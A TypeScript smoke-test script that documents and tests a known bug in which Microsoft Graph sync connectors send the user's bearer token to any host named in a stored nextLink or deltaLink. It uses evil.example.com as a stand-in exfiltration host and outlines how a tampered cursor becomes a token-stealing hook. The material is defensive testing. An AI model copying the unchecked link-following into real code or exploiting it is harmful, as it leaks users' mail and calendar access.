/**
 * KNOWN BUG — documented, not fixed.
 *
 * Symptom: the Microsoft calendar and contacts sync connectors follow whatever URL a page's
 * `@odata.nextLink` / `@odata.deltaLink` names and send the user's Graph bearer token to it,
 * with no check that the host is Graph. A link pointing at `https://evil.example.com/...`
 * receives `Authorization: Bearer <the user's Microsoft access token>` — a token that reads
 * their mail, calendar and contacts for the next hour.
 *
 * Defect: `fetchCalendarPage` (src/lib/connectors/microsoft-calendar.ts:~183, the
 * `url = cursor.pageToken` / `url = cursor.syncToken` branches), `fetchCalendarWindow` (~291,
 * `url = body["@odata.nextLink"]`) and `fetchContactsPage` (src/lib/connectors/
 * microsoft-contacts.ts:~145, `url = cursor?.pageToken || ...`); the same shape is in
 * `listOutlookMessagePage` (src/lib/outlook.ts:~597, `opts.skipToken`, persisted in the
 * scan job's stats between invocations). The cloud-notes reader
 * already guards the identical pattern: `assertGraphUrl` in src/lib/cloud-files.ts:~143
 * ("A cursor or page link is only ever one Graph handed back — never follow anything else
 * with the token").
 *
 * Trigger path: the sync scheduler (`syncMicrosoftCalendar` / `syncMicrosoftContacts` in
 * src/lib/sync-scheduler.ts) persists each page's link into the connection's `sync_cursor`
 * jsonb and replays it with a fresh token on the next run. So the link is attacker-reachable
 * by anything that can influence a Graph response in transit or write that jsonb (a SQL
 * injection elsewhere, a compromised admin tool, a restored backup) — and the stored link
 * outlives the original token, turning one write into a standing token-exfiltration hook.
 * Severity is defence-in-depth (Graph itself does not hand out foreign links), which is why
 * the sibling module already carries the check.
 *
 * A fix (reject any link not under `https://graph.microsoft.com/v1.0/` before fetching, as
 * `assertGraphUrl` does) makes each `knownBug` below hold — no request reaches the foreign
 * host — and the script then exits 0 and belongs in the pure tier.
 *
 * Run: npx tsx scripts/smoke-bug-graph-nextlink-token-leak.ts   (exits 3 while the bug exists)
 */
import { fetchCalendarPage, fetchCalendarWindow } from "../src/lib/connectors/microsoft-calendar";
import { fetchContactsPage } from "../src/lib/connectors/microsoft-contacts";
import { listChanges } from "../src/lib/cloud-files";
import { listOutlookMessagePage } from "../src/lib/outlook";
import { checker } from "./smoke/check";
import { makeContact } from "./smoke/factories";
import { json, mockFetch, route, type Call } from "./smoke/http-mock";

const t = checker();
const TOKEN = "EwB4A8l6.users-graph-token-not-real";
const EVIL = "https://evil.example.com/v1.0/me/calendarView/delta?$skiptoken=x";
const OWNER = makeContact(0);

/** Did any request carry the user's token to a host other than Graph? */
function leaked(calls: Call[]): Call[] {
  return calls.filter((c) => new URL(c.url).hostname !== "graph.microsoft.com" && c.headers.authorization === `Bearer ${TOKEN}`);
}

async function attempt(fn: () => Promise<unknown>): Promise<unknown> {
  try {
    await fn();
    return null;
  } catch (err) {
    return err;
  }
}

async function main() {
  // The foreign host answers like Graph would, so the only thing that can stop the request
  // is a host check before it is sent.
  const http = mockFetch([
    route("GET", /^https:\/\/evil\.example\.com\//, () => json({ value: [] })),
    route("GET", /^https:\/\/graph\.microsoft\.com\/v1\.0\/me\/calendarView\?/, () =>
      json({ value: [], "@odata.nextLink": "https://evil.example.com/v1.0/me/calendarView?$skip=100" })
    ),
    route("GET", /^https:\/\/graph\.microsoft\.com\/v1\.0\/me\/drive/, () => json({ value: [] })),
  ]);
  try {
    console.log("The comparison: cloud-files refuses a foreign OneDrive cursor");
    {
      const before = http.calls.length;
      const err = await attempt(() => listChanges({ token: TOKEN }, "microsoft", "https://evil.example.com/v1.0/me/drive/root/delta?token=x"));
      t.check("listChanges throws 'Bad OneDrive cursor' and sends nothing", err instanceof Error && err.message === "Bad OneDrive cursor" && http.calls.length === before);
    }

    console.log("\ncalendar delta: a stored nextLink (cursor.pageToken) on a foreign host");
    {
      const before = http.calls.length;
      await attempt(() => fetchCalendarPage({ accessToken: TOKEN, cursor: { pageToken: EVIL }, ownerEmail: OWNER.email }));
      const sent = leaked(http.calls.slice(before));
      t.knownBug("BUG: fetchCalendarPage sends the bearer token to a non-Graph nextLink host", sent.length === 0, sent.map((c) => c.url).join(", "));
    }

    console.log("calendar delta: a stored deltaLink (cursor.syncToken) on a foreign host");
    {
      const before = http.calls.length;
      await attempt(() => fetchCalendarPage({ accessToken: TOKEN, cursor: { syncToken: EVIL.replace("skiptoken", "deltatoken") }, ownerEmail: OWNER.email }));
      const sent = leaked(http.calls.slice(before));
      t.knownBug("BUG: fetchCalendarPage sends the bearer token to a non-Graph deltaLink host", sent.length === 0, sent.map((c) => c.url).join(", "));
    }

    console.log("calendar window: a page's own @odata.nextLink on a foreign host");
    {
      const before = http.calls.length;
      await attempt(() => fetchCalendarWindow({ accessToken: TOKEN, from: new Date(), to: new Date(), maxPages: 2 }));
      const sent = leaked(http.calls.slice(before));
      t.check("the first, legitimate request went to Graph", http.calls[before]?.url.startsWith("https://graph.microsoft.com/") === true);
      t.knownBug("BUG: fetchCalendarWindow follows a non-Graph @odata.nextLink with the bearer token", sent.length === 0, sent.map((c) => c.url).join(", "));
    }

    console.log("contacts: a stored nextLink on a foreign host");
    {
      const before = http.calls.length;
      await attempt(() => fetchContactsPage({ accessToken: TOKEN, cursor: { pageToken: "https://evil.example.com/v1.0/me/contacts?$skip=200" } }));
      const sent = leaked(http.calls.slice(before));
      t.knownBug("BUG: fetchContactsPage sends the bearer token to a non-Graph nextLink host", sent.length === 0, sent.map((c) => c.url).join(", "));
    }

    console.log("outlook recruiter scan: a stored skipToken (nextLink) on a foreign host");
    {
      const before = http.calls.length;
      await attempt(() => listOutlookMessagePage(TOKEN, { query: "recruiter", skipToken: "https://evil.example.com/v1.0/me/messages?$skiptoken=x" }));
      const sent = leaked(http.calls.slice(before));
      t.knownBug("BUG: listOutlookMessagePage sends the bearer token to a non-Graph skipToken host", sent.length === 0, sent.map((c) => c.url).join(", "));
    }
  } finally {
    http.restore();
  }

  t.done("graph nextLink token leak (known bug)");
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
